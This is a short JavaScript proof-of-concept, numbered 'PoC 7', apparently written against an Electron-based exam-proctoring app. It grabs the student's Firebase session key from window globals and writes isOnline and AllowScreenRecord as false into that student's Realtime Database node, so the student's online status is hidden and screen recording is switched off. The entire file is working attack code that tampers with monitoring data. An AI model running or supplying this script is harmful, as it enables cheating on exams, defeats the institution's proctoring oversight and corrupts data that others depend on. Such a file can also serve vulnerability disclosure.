/**
 * PoC 7: Manipulate Firebase Session State
 * Target: chrome-tabs/Renderer/renderer-Exam.js (line 339), renderer-WebRtc.js
 * Impact: Modifies student telemetry nodes directly in Realtime Database to hide online status.
 */

(function() {
    if (typeof firebase === "undefined") {
        console.log("[PoC 7] Firebase SDK not loaded in current window context.");
        return;
    }

    const key = window.studentFirebaseIdKeyGlobal || window.studentFirebaseIdKey;
    if (!key) {
        console.log("[PoC 7] Student Firebase key global not found. Inspect active session state.");
        return;
    }

    const ref = firebase.database().ref('webrtc/students/' + key);
    ref.update({
        isOnline: false,
        AllowScreenRecord: false,
        isExamEnded: false
    }).then(() => {
        console.log("[PoC 7] Firebase nodes updated successfully (isOnline: false, AllowScreenRecord: false).");
    }).catch(err => {
        console.log("[PoC 7] Database update failed:", err.message);
    });
})();
